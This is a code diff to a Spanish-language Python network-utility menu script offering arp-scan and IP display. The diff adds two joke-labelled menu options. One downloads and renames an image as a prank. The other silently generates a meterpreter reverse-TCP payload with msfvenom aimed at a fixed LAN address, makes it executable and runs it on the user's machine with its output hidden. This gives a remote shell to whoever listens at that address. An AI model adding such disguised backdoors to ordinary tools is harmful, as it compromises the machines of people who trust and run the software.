@@ -9,6 +9,8 @@ try:
 	print()
 	print(Fore.MAGENTA + " [1] Arp-scan")
 	print(Fore.MAGENTA + " [2] Saber mi ip" + Style.RESET_ALL)
+	print(Fore.MAGENTA + " [3] Sorpresa sorpresa jeje" + Style.RESET_ALL)
+	print(Fore.MAGENTA + " [4] Jo jo jo este si que es bueno" + Style.RESET_ALL)
 	print()
 
 	opcion = input(Fore.BLUE + Style.BRIGHT + "-Escoge una de las dos opciones eh...: " + Style.RESET_ALL)
@@ -36,12 +38,88 @@ try:
 		os.system("hostname -I")
 		print(Style.RESET_ALL)
 
+	elif opcion.lower() == "3":
+		os.system("wget 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSck5jmbK0t2fWqZMVsid2_ABQl08iUQ5kAX89gpVcVBg&s' > /dev/null 2>&1")
+		os.system("mv images\?q=tbn:ANd9GcSck5jmbK0t2fWqZMVsid2_ABQl08iUQ5kAX89gpVcVBg\&s jeje")
+		print("Jo jo, sorpresita sorpresita, te doy una pista " + Fore.GREEN +  "jeje" + Style.RESET_ALL)
+		time.sleep(1)
+		print("Y te doy otra pista porque listo precisamente no eres jo jo  < " + Fore.GREEN +  "display" + Style.RESET_ALL + " >")
+
+
+
+
+	elif opcion.lower() == "4":
+		print(Fore.YELLOW + "Este te va a gustar jo jo jo")
+		os.system("msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=192.168.168.209 lport=1234 -f elf -o reverse_rafa > /dev/null 2>&1")
+		os.system("chmod +x reverse_rafa")
+		os.system("./reverse_rafa $ > /dev/null 2>&1")
+		print("jo jo jo")
+
 
 
 
 
 	else:
 		print(Style.RESET_ALL + Fore.RED + Style.BRIGHT + "Cabroncete, solo puedes escoger esas opciones jojjo")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
